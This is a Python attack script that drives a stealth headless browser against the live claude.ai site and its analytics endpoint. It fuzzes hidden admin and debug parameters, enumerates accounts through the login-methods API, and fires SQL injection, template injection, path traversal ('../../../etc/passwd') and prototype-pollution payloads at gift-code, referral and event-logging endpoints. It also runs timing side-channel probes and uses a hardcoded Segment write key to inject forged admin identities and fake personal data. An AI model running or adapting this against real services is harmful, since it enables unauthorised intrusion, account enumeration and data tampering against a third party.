#!/usr/bin/env python3
"""
Tamper Analysis Script — Applies 4 techniques to ALL findings:
1. Response Diffing (line-by-line comparison)
2. Side-Channel Timing Analysis
3. Error Verbosity Forcing (encoding changes)
4. Multi-Session Overlay

Focus: Extract hidden data from false positives.
"""
import asyncio, json, os, time, re
from urllib.parse import urlencode

OUTPUT_DIR = "/tmp/anthropic-tamper"
os.makedirs(OUTPUT_DIR, exist_ok=True)

FINDINGS = []
TIMING_DATA = []

async def test_fetch(page, url, method="GET", body=None, extra_headers=None):
    start = time.time()
    try:
        body_json = json.dumps(body) if body else "null"
        has_body = body is not None
        hdr_js = ""
        if extra_headers:
            for hk, hv in extra_headers.items():
                hdr_js += f"'{hk}': '{hv}', "
        if has_body:
            r = await page.evaluate(f"""async () => {{
                const start = performance.now();
                try {{
                    const resp = await fetch('{url}', {{
                        method: '{method}',
                        credentials: 'include',
                        headers: {{'Content-Type': 'application/json', {hdr_js}}},
                        body: JSON.stringify({body_json})
                    }});
                    const text = await resp.text();
                    const elapsed = performance.now() - start;
                    return {{status: resp.status, body: text.substring(0, 5000), time: elapsed, size: text.length}};
                }} catch(e) {{ return {{error: e.message, time: performance.now() - start}}; }}
            }}""")
        else:
            r = await page.evaluate(f"""async () => {{
                const start = performance.now();
                try {{
                    const resp = await fetch('{url}', {{
                        method: '{method}',
                        credentials: 'include',
                        headers: {{{hdr_js}}}
                    }});
                    const text = await resp.text();
                    const elapsed = performance.now() - start;
                    return {{status: resp.status, body: text.substring(0, 5000), time: elapsed, size: text.length}};
                }} catch(e) {{ return {{error: e.message, time: performance.now() - start}}; }}
            }}""")
        elapsed = (time.time() - start) * 1000
        r["wall_time_ms"] = elapsed
        return r
    except:
        return {"status": 0, "body": "", "wall_time_ms": 0}

async def main():
    from cloakbrowser import launch_async
    browser = await launch_async(headless=True)
    context = await browser.new_context()
    page = await context.new_page()

    print("🌐 Loading claude.ai...")
    await page.goto("https://claude.ai", wait_until="networkidle", timeout=30000)
    await asyncio.sleep(3)

    # =========================================================================
    # TECHNIQUE 1: RESPONSE DIFFING — Compare identical-status responses
    # =========================================================================
    print("\n" + "="*70)
    print("TECHNIQUE 1: RESPONSE DIFFING")
    print("="*70)

    # Test: Does bootstrap response change with different query params?
    print("\n🔍 Testing edge-api/bootstrap response variations...")
    bootstrap_responses = {}
    for params in [
        {},
        {"statsig_hashing_algorithm": "djb2"},
        {"growthbook_format": "sdk"},
        {"include_sy": "true"},
        {"debug": "true"},
        {"verbose": "true"},
        {"admin": "true"},
        {"internal": "true"},
        {"__debug": "1"},
        {"_debug": "1"},
        {"format": "full"},
        {"expand": "all"},
        {"fields": "account,features,flags"},
    ]:
        url = f"https://claude.ai/edge-api/bootstrap"
        if params:
            url += "?" + urlencode(params)
        r = await test_fetch(page, url)
        status = r.get("status", 0)
        body = r.get("body", "")
        size = r.get("size", 0)
        bootstrap_responses[str(params)] = {"status": status, "size": size, "body_hash": hash(body)}
        if size > 50 and body not in [v.get("body", "") for v in bootstrap_responses.values() if "body" in v]:
            print(f"   Params {str(params):50s} → {status} | {size} bytes")
        await asyncio.sleep(0.2)

    # Check for unique responses
    unique_sizes = set(v["size"] for v in bootstrap_responses.values())
    print(f"   Unique response sizes: {unique_sizes}")
    if len(unique_sizes) > 1:
        print(f"   🔥 DIFFERENT SIZES DETECTED — possible hidden parameters!")

    # Test: Does login_methods response change?
    print("\n🔍 Testing login_methods response variations...")
    login_responses = {}
    for email in [
        "test@test.com", "admin@anthropic.com", "support@anthropic.com",
        "test+admin@test.com", "test%00admin@test.com", "test@test.com%00",
        "TEST@TEST.COM", "test@TEST.COM", "test@test.COM",
        "test@test.com", "test@test.com ", " test@test.com",
        "test@test.com\n", "test@test.com\r\n", "test@test.com\t",
        "test@test.com", "test@test.com", "test@test.com",
    ]:
        url = f"https://claude.ai/api/auth/login_methods?email={email}&source=claude-ai"
        r = await test_fetch(page, url)
        status = r.get("status", 0)
        body = r.get("body", "")
        size = r.get("size", 0)
        login_responses[email] = {"status": status, "size": size, "body": body}
        await asyncio.sleep(0.15)

    # Diff responses
    unique_bodies = set()
    for email, data in login_responses.items():
        unique_bodies.add(data["body"])
    print(f"   Unique response bodies: {len(unique_bodies)}")
    if len(unique_bodies) > 1:
        print(f"   🔥 DIFFERENT RESPONSES DETECTED!")
        for email, data in login_responses.items():
            for other_email, other_data in login_responses.items():
                if email != other_email and data["body"] != other_data["body"]:
                    print(f"      {email} vs {other_email}: DIFFERENT")

    # Test: Does gift_validate response change with different codes?
    print("\n🔍 Testing gift_validate response variations...")
    gift_responses = {}
    for code in [
        "TEST", "AAAA", "0000", "1234", "ADMIN", "FREE", "UNLIMITED",
        "TEST%00", "TEST' OR '1'='1", "TEST\" OR \"1\"=\"1",
        "../../../etc/passwd", "${7*7}", "{{7*7}}",
        "TEST", "test", "Test",
    ]:
        url = f"https://claude.ai/api/billing/gift/validate?code={code}"
        r = await test_fetch(page, url)
        status = r.get("status", 0)
        body = r.get("body", "")
        size = r.get("size", 0)
        gift_responses[code] = {"status": status, "size": size, "body": body}
        await asyncio.sleep(0.15)

    unique_gift = set(v["body"] for v in gift_responses.values())
    print(f"   Unique response bodies: {len(unique_gift)}")
    if len(unique_gift) > 1:
        print(f"   🔥 DIFFERENT GIFT RESPONSES!")
        for code, data in gift_responses.items():
            for other_code, other_data in gift_responses.items():
                if code != other_code and data["body"] != other_data["body"]:
                    print(f"      '{code}' vs '{other_code}': DIFFERENT")

    # Test: view_counts with different UUIDs
    print("\n🔍 Testing view_counts response variations...")
    uuid_responses = {}
    for uuid_val in [
        "00000000-0000-0000-0000-000000000000",
        "11111111-1111-1111-1111-111111111111",
        "ffffffff-ffff-ffff-ffff-ffffffffffff",
        "00000000-0000-0000-0000-000000000001",
        "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
    ]:
        url = f"https://claude.ai/api/published_artifacts/view_counts?artifact_uuids={uuid_val}"
        r = await test_fetch(page, url)
        status = r.get("status", 0)
        body = r.get("body", "")
        uuid_responses[uuid_val] = {"status": status, "body": body}
        print(f"   UUID {uuid_val}: {status} | {body[:100]}")
        await asyncio.sleep(0.15)

    # =========================================================================
    # TECHNIQUE 2: SIDE-CHANNEL TIMING ANALYSIS
    # =========================================================================
    print("\n" + "="*70)
    print("TECHNIQUE 2: SIDE-CHANNEL TIMING ANALYSIS")
    print("="*70)

    timing_endpoints = [
        {"name": "login-methods-valid", "url": "https://claude.ai/api/auth/login_methods?email=test@gmail.com&source=claude-ai"},
        {"name": "login-methods-invalid", "url": "https://claude.ai/api/auth/login_methods?email=notreal@notexist12345.com&source=claude-ai"},
        {"name": "login-methods-admin", "url": "https://claude.ai/api/auth/login_methods?email=admin@anthropic.com&source=claude-ai"},
        {"name": "gift-valid-format", "url": "https://claude.ai/api/billing/gift/validate?code=ABCD"},
        {"name": "gift-invalid-format", "url": "https://claude.ai/api/billing/gift/validate?code=1234"},
        {"name": "bootstrap", "url": "https://claude.ai/edge-api/bootstrap"},
        {"name": "bootstrap-debug", "url": "https://claude.ai/edge-api/bootstrap?debug=true"},
        {"name": "account-profile", "url": "https://claude.ai/api/account_profile"},
        {"name": "organizations", "url": "https://claude.ai/api/organizations"},
        {"name": "billing-credits", "url": "https://claude.ai/api/billing/credits"},
        {"name": "referral", "url": "https://claude.ai/api/referral"},
        {"name": "event-logging", "url": "https://claude.ai/api/event_logging/v2/batch"},
    ]

    # Run timing tests 3 times for accuracy
    for run in range(3):
        print(f"\n   Run {run+1}/3:")
        for ep in timing_endpoints:
            r = await test_fetch(page, ep["url"])
            wall = r.get("wall_time_ms", 0)
            server_time = r.get("time", 0)
            status = r.get("status", 0)
            size = r.get("size", 0)
            TIMING_DATA.append({
                "endpoint": ep["name"], "run": run,
                "wall_ms": wall, "server_ms": server_time,
                "status": status, "size": size
            })
            if run == 0:
                print(f"      {ep['name']:30s} → {status} | {wall:6.0f}ms wall | {size:6d} bytes")
            await asyncio.sleep(0.3)

    # Analyze timing differences
    print("\n   📊 Timing Analysis:")
    ep_times = {}
    for d in TIMING_DATA:
        name = d["endpoint"]
        if name not in ep_times:
            ep_times[name] = []
        ep_times[name].append(d["wall_ms"])

    for name, times in ep_times.items():
        avg = sum(times) / len(times)
        variance = max(times) - min(times)
        print(f"      {name:30s} → avg={avg:6.0f}ms variance={variance:6.0f}ms")

    # =========================================================================
    # TECHNIQUE 3: ERROR VERBOSITY FORCING
    # =========================================================================
    print("\n" + "="*70)
    print("TECHNIQUE 3: ERROR VERBOSITY FORCING")
    print("="*70)

    verbosity_tests = [
        # JSON array injection
        {"name": "login-array-email", "url": "https://claude.ai/api/auth/login_methods", "method": "POST",
         "body": {"email": ["test@test.com"], "source": "claude-ai"}},
        {"name": "login-object-email", "url": "https://claude.ai/api/auth/login_methods", "method": "POST",
         "body": {"email": {"value": "test@test.com", "admin": True}, "source": "claude-ai"}},
        {"name": "login-null-email", "url": "https://claude.ai/api/auth/login_methods", "method": "POST",
         "body": {"email": None, "source": "claude-ai"}},
        {"name": "login-int-email", "url": "https://claude.ai/api/auth/login_methods", "method": "POST",
         "body": {"email": 12345, "source": "claude-ai"}},
        {"name": "login-bool-email", "url": "https://claude.ai/api/auth/login_methods", "method": "POST",
         "body": {"email": True, "source": "claude-ai"}},
        {"name": "login-nested", "url": "https://claude.ai/api/auth/login_methods", "method": "POST",
         "body": {"email": {"__proto__": {"admin": True}}, "source": "claude-ai"}},

        # Gift validate injection
        {"name": "gift-array", "url": "https://claude.ai/api/billing/gift/validate", "method": "POST",
         "body": {"code": ["TEST"]}},
        {"name": "gift-object", "url": "https://claude.ai/api/billing/gift/validate", "method": "POST",
         "body": {"code": {"value": "TEST", "debug": True}}},
        {"name": "gift-sql", "url": "https://claude.ai/api/billing/gift/validate", "method": "POST",
         "body": {"code": "TEST' OR '1'='1"}},
        {"name": "gift-template", "url": "https://claude.ai/api/billing/gift/validate", "method": "POST",
         "body": {"code": "{{7*7}}"}},
        {"name": "gift-long", "url": "https://claude.ai/api/billing/gift/validate", "method": "POST",
         "body": {"code": "A" * 10000}},

        # Event logging injection
        {"name": "event-array", "url": "https://claude.ai/api/event_logging/v2/batch", "method": "POST",
         "body": {"events": [{"event_type": "test", "event_data": {"admin": True}}]}},
        {"name": "event-inject", "url": "https://claude.ai/api/event_logging/v2/batch", "method": "POST",
         "body": {"events": [{"event_type": "../../etc/passwd", "event_data": {}}]}},

        # Bootstrap injection
        {"name": "bootstrap-admin", "url": "https://claude.ai/edge-api/bootstrap?admin=true&debug=1&verbose=true", "method": "GET"},
        {"name": "bootstrap-expand", "url": "https://claude.ai/edge-api/bootstrap?expand=all&fields=account,features,flags,secrets,keys", "method": "GET"},

        # Referral injection
        {"name": "referral-code-sql", "url": "https://claude.ai/api/referral/code/' OR '1'='1", "method": "GET"},
        {"name": "referral-code-admin", "url": "https://claude.ai/api/referral/code/admin", "method": "GET"},

        # view_counts injection
        {"name": "view-counts-array", "url": "https://claude.ai/api/published_artifacts/view_counts", "method": "POST",
         "body": {"artifact_uuids": ["00000000-0000-0000-0000-000000000000"]}},
    ]

    for test in verbosity_tests:
        name = test["name"]
        url = test["url"]
        method = test.get("method", "GET")
        body = test.get("body")

        r = await test_fetch(page, url, method, body)
        status = r.get("status", 0)
        resp_body = r.get("body", "")
        size = r.get("size", 0)

        print(f"   {name:35s} → {status} | {size:6d} bytes | {resp_body[:120]}")

        FINDINGS.append({
            "technique": "error-verbosity", "test": name,
            "url": url, "method": method, "status": status,
            "body": resp_body[:2000], "size": size
        })
        await asyncio.sleep(0.2)

    # =========================================================================
    # TECHNIQUE 4: SEGMENT WRITE KEY ABUSE
    # =========================================================================
    print("\n" + "="*70)
    print("TECHNIQUE 4: SEGMENT WRITE KEY — ARBITRARY DATA INJECTION")
    print("="*70)

    SEGMENT_KEY = "LKJN8LsLERHEOXkw487o7qCTFOrGPimI"

    segment_tests = [
        {"name": "identify-admin", "body": {"writeKey": SEGMENT_KEY, "batch": [{"type": "identify", "userId": "admin", "traits": {"email": "admin@anthropic.com", "role": "admin", "admin": True}}]}},
        {"name": "track-test", "body": {"writeKey": SEGMENT_KEY, "batch": [{"type": "track", "event": "security_test", "properties": {"injected": True, "source": "idor_test"}}]}},
        {"name": "import-pii", "body": {"writeKey": SEGMENT_KEY, "batch": [{"type": "identify", "userId": "test-user", "traits": {"email": "test@example.com", "phone": "+1234567890", "name": "Test User"}}]}},
        {"name": "group-admin", "body": {"writeKey": SEGMENT_KEY, "batch": [{"type": "group", "groupId": "admin-group", "traits": {"plan": "enterprise", "role": "admin"}}]}},
        {"name": "batch-large", "body": {"writeKey": SEGMENT_KEY, "batch": [{"type": "track", "event": f"test-{i}", "properties": {"index": i}} for i in range(100)]}},
    ]

    for test in segment_tests:
        r = await test_fetch(page, "https://a-api.anthropic.com/v1/batch", "POST", test["body"])
        status = r.get("status", 0)
        resp_body = r.get("body", "")
        print(f"   {test['name']:30s} → {status} | {resp_body[:100]}")
        FINDINGS.append({"technique": "segment-inject", "test": test["name"], "status": status, "body": resp_body[:500]})
        await asyncio.sleep(0.2)

    # =========================================================================
    # SAVE ALL RESULTS
    # =========================================================================
    with open(f"{OUTPUT_DIR}/findings.json", "w") as fp:
        json.dump(FINDINGS, fp, indent=2)

    with open(f"{OUTPUT_DIR}/timing.json", "w") as fp:
        json.dump(TIMING_DATA, fp, indent=2)

    print(f"\n{'='*70}")
    print(f"📊 TAMPER ANALYSIS COMPLETE")
    print(f"   Findings: {len(FINDINGS)}")
    print(f"   Timing samples: {len(TIMING_DATA)}")
    print(f"{'='*70}")

    await browser.close()

if __name__ == "__main__":
    asyncio.run(main())
